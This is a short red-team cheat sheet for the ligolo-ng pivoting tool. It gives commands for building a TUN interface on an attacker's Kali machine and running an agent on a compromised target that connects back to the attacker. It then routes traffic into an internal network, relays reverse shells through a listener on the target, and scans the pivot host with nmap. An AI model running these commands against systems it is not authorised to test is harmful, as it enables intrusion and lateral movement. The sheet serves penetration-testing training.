# 🛡️ ligolo-ng Cheat Sheet

External Interface: `10.1.1.10/24`  
Internal Interface: `10.1.2.4/24`

## 🖥️ On Kali (Attacker Machine)
1. Create and enable the TUN interface
```bash
ip tuntap add user root mode tun ligolo
ip link set ligolo up
ip addr show ligolo
```
2. Start the ligolo proxy
```bash
ligolo-proxy -selfcert
# Use -autocert during real red team engagements
```
## 🧩 On Target Machine
3. Run the agent to connect to the attacker
```bash
./agent -connect <kali_ip>:11601 -ignore-cert
# If -autocert was used on the proxy, -ignore-cert is not required
```
## 🔗 On Kali (in ligolo-ng session)
4. Interact with session
```bash
ligolo-ng » session
```
5. Add a route to the internal network
```bash
ip route add 10.1.2.0/24 dev ligolo
```
6. Start the tunnel
```bash
start
```
✅ Tunnel to the internal network is now established.
## 🔄 Reverse Shell from Internal to Attacker (Port Redirection)
7. Setup a listener inside the ligolo-ng session
```bash
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp

# 0.0.0.0:30000 → Listens on the target machine
# 127.0.0.1:10000 → Redirects traffic to attacker machine

💡 While generating a reverse shell payload:
# Use target machine’s IP and port 30000 (or any random port)
# Traffic will be forwarded to attacker's port 10000 (or any random port)
```
## 📡 Access Pivot Machine’s Ports (Direct Scanning)
8. Add a specific route to access the pivot machine itself
```bash
ip route add 240.0.0.1/32 dev ligolo
# 240.0.0.1 is a special IP address used by ligolo-ng to represent the pivot machine itself (the host where the agent is running).
```
9. Scan the pivot machine using Nmap
```bash
nmap 240.0.0.1
```
🔍 This will reveal open ports on the pivot machine, accessible via the ligolo tunnel.
🧹 Cleanup – Deleting the ligolo Interface (On Kali)
10. Remove the TUN interface after you're done
```bash
ip link set ligolo down
ip link delete ligolo
# Safely deletes the ligolo TUN interface from your Kali machine.
```
